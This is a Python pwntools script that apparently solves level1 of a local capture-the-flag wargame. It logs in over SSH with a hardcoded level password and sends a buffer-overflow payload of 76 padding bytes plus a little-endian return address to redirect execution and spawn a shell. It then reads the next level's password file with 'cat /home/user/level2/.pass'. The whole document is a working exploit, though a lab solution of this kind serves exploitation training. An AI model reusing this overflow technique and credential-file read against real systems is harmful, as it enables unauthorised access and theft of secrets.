from pwn import *

HOST = 'localhost'
PORT = 4243
# current level
USER = 'level1'
# pass for current level (in /home/user/{USER}/.pass)
PASS = '1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a'

def main():
    # creates a new ssh connection https://docs.pwntools.com/en/latest/tubes/ssh.html
    connection = ssh(host=HOST, port=PORT, user=USER, password=PASS)

    # requires python on remote server
    process = connection.process(f'/home/user/{USER}/{USER}')

    # We know the offset is 76 from gdb exploration
    # We got 0x08048444 as the address of the first instruction of 'run'
    # The payload has to be 76 random char followed by the little endian form of the address
    payload = b'.'*76 + b'\x44\x84\x04\x08'

    process.sendline(payload)

    # Print the vm's stdout until first shell input
    print(process.recvuntil(b'$ '))

    process.sendline(b'cat /home/user/level2/.pass')
    # Print the flag
    print(process.recv())

main()
